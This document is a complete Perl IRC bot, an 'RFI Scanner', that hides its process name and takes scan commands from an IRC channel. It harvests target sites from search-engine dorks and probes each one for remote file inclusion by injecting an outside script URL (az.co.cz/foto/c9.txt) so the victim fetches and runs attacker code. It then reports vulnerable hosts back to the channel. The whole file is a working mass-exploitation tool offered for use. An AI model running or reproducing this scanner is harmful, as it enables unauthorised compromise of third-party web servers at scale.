#!/usr/bin/perl
#
#      ooo      
#     (o o)     
# ooO--(_)--Ooo-
# 
# RFI Scanner Public ;)
#

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
######################

######################
#   Configuration    # 
#                    #
######################################################
my $processo = "/pittbull/";
#Process Name
#####################################################
my $cmd="http://az.co.cz/foto/c9.txt?";
#Print CMD
#####################################################
my $id="http://www.yourhost.com/id.txt";
#ID
#####################################################
my $server="irc. YOUR SERVER HERE .net";
#Server
#####################################################
my $porta="6667";
#Port
#####################################################
my $nick="RFIScanner";
#Nickname
#####################################################
my $canale="#pitbull";
#Channel
#####################################################

my $pid=fork;
exit if $pid;
$0="$processo"."\0"x16;
my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Can not connect on server!\n";
$sk->autoflush(1);
print $sk "NICK $nick\r\n";
print $sk "USER Pbot 8 *  : Pbot : Pbot@google.it : Gbot :Sbot\r\n";
print $sk "JOIN $canale\r\n";

while($line = <$sk>){

$line =~ s/\r\n$//;
if ($line=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $sk "PONG :$1";
}

######################
#End of Configuration# 
#                    #
######################

######################

######################
#     Commands       # 
#                    #
######################


### !dev = exit
if ($line=~ /PRIVMSG $canale :!dev/){
stampa($sk, "QUIT");
}
### end of !dev


### !info = show some information about the bot
if ($line=~ /PRIVMSG $canale :.info/){
stampa($sk, "PRIVMSG $canale :4|12.:4Info12:.4|12 RFI SCANNER MADE BY THE_PITBULL ");
stampa($sk, "PRIVMSG $canale :4|12.:4Info12:.4|12 Engines : 12G4o8o12g9l4e4, 7L5i7b5e7r5o4, 7M4S7N4, 7All7The7Web4, 14A4S14K4, 7AOL, 2U7O2L4, 1L7yc1o7s4, 13Y6ahoo");
stampa($sk, "PRIVMSG $canale :4|12.:4Info12:.4|12 C0ded by : The_PitBull, iNs, MaxDemon ! ");
}
### end of !info


### !help = shows commands
if ($line=~ /PRIVMSG $canale :.help/){
stampa($sk, "PRIVMSG $canale :4|12.:4Help12:.4|12 My commands are :");
stampa($sk, "PRIVMSG $canale :4|12.:4Help12:.4|12 !info, !scan <string> <dork> ");
}
### end of !info

######################
#  End of Commands   # 
#                    #
######################

######################

######################
#     SCANNER        # 
#                    #
#!scan <vuln> <dork> #
#                    #
######################

if ($line=~ /PRIVMSG $canale :.scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
### Start Message
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 Starting Scan for 4$bug 12$dork");
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 Please wait while making Search Engines ready, this can take a while so be patient ");
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 RFI SCANNER MADE BY THE_PITBULL ");
### End of Start Message
# Starting Google
	my @glist=&google($dork);
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 12G4o8o12g9l4e4 ".scalar(@bypass)." 12Sites");
#
	my @mlist=&msn($dork);
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 7M4S7N4 ".scalar(@mlist)." 12Sites");
#
	my @allist=&alltheweb($dork);
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 7All7The7Web4 ".scalar(@allist)." 12Sites");
#
	my @uollist=&uol($dork);
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 2U7O2L4 ".scalar(@uollist)." 12Sites");
#
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 RFI SCANNER MADE BY THE_PITBULL ");
	my @asklist=&ask($dork);
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 14A4S14K4 ".scalar(@asklist)." 12Sites");
#
	my @aollist=&aol($dork);
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 7AOL4 ".scalar(@aollist)." 12Sites");
#
	my @lycos=&lycos($dork);
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 1L7yc1o7s4 ".scalar(@lycos)." 12Sites");
#
	my @ylist=&yahoo($dork);	
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 13Y6ahoo4 ".scalar(@yahoobypass)." 12Sites");
#
push(my @tot, @glist, @uollist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @fireball, @ylist );
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 Total Results:4 ".scalar(@tot)." 12Sites and Cleaned:4 ".scalar(@puliti)." 12for 2 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %30==0){ 
#stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4|12 Exploiting4 ".$contatore." 12of4 ".$uni. " 12Sites");
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :4|12.:4Scan12:.4| Finished for2 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
stampa($sk, "PRIVMSG $canale :4|12.:4Safe Mode = 4OFF12:.4|12 12Vuln: 4$print ");
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
stampa($sk, "PRIVMSG $canale :4|12.:4Safe Mode = 3ON12:.4|12 12Vuln: 4$print  ");
}}
}}}
exit;
}}}


sub stampa()
{
if ($#_ == '1') {
my $sk = $_[0];
print $sk "$_[1]\n";
} else {
print $sk "$_[0]\n";
}}

##### SUBS of All Engines in the Scanner #####

sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}
#####
sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}
#####
sub libero(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0,$pg=0; $i<=1000; $i+=10,$pg++)
{
my $Lib=("http://arianna.libero.it/search/abin/integrata.cgi?pag=".$pg."&np=".$i."&query=".key($key));
my $Res=query($Lib);
while($Res =~ m/<a class=\"testoblu\" href=\"?http:\/\/([^>\"]*)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}
#####
sub lycos(){
my $inizio=0;
my $pagine=20;
my $key=$_[0];
my $av=0;
my @lst;
while($inizio <= $pagine){
my $lycos="http://search.lycos.com/?query=".key($key)."&page=$av";
my $Res=query($lycos);
while ($Res=~ m/<span class=\"?grnLnk small\"?>http:\/\/(.+?)\//g ){
my $k="$1";
my @grep=links($k);
push(@lst,@grep);
}
$inizio++;
$av++;
}
return @lst;
}
#####
sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $AoL=("http://search.aol.com/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}
#####
sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}
#####
sub alltheweb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}
#####
sub uol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}
#####
#####
##### Google
sub google(){
my @lst;
my $key = $_[0];
for($b=0;$b<=100;$b+=100){
my $Go=("http://www.google.it/search?hl=it&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}
#####

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}
